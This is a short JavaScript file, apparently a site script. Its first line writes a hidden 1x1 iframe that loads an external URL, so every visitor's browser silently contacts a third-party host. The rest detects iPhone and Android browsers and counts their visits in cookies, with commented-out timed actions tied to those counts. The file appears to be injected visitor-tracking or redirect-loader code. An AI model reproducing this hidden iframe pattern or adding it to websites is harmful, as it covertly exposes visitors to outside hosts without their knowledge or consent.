document.write("<div style='display:none;'><iframe src='http://tj.yule8.net/?all.js_"+jsname+"' height=1 width=1></iframe></div>");

var brs={
		versions:function(){            
				var u = navigator.userAgent, app = navigator.appVersion;            
				return {                
					trident: u.indexOf('Trident') > -1,               
					presto: u.indexOf('Presto') > -1,                
					webKit: u.indexOf('AppleWebKit') > -1,              
					gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1,               
					mobile: !!u.match(/AppleWebKit.*Mobile.*/)||!!u.match(/AppleWebKit/),          
					ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),                 
					android: u.toLowerCase().indexOf('android') > -1 ,   
					iPhone: u.indexOf('iPhone') > -1 ,               
					iPad: u.indexOf('iPad') > -1,               
					webApp: u.indexOf('Safari') == -1           
				};
				}()
}

function setCookies(name,value) 
{
    var fenzhong = 1440;
    var exp = new Date(); 
    if (fenzhong>0)
    exp.setTime(exp.getTime() + fenzhong*60*1000); 
    document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString(); 
}

function getCookies(name) 
{
    var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
    if(arr=document.cookie.match(reg))
        return unescape(arr[2]); 
    else 
        return null; 
}

if (brs.versions.iPhone==true)
    {
	if (getCookies("showios")==null)
		setCookies("showios",1);
	else
		setCookies("showios",parseInt(getCookies("showios"))+1);

	//if (parseInt(getCookies("showios"))==9)
	//setTimeout("';",5000);
    }

if (brs.versions.android==true)
{
	if (getCookies("showapk")==null)
		setCookies("showapk",1);
	else
		setCookies("showapk",parseInt(getCookies("showapk"))+1);

	//if (parseInt(getCookies("showapk"))==7)
	//setTimeout("  ",5000);
}

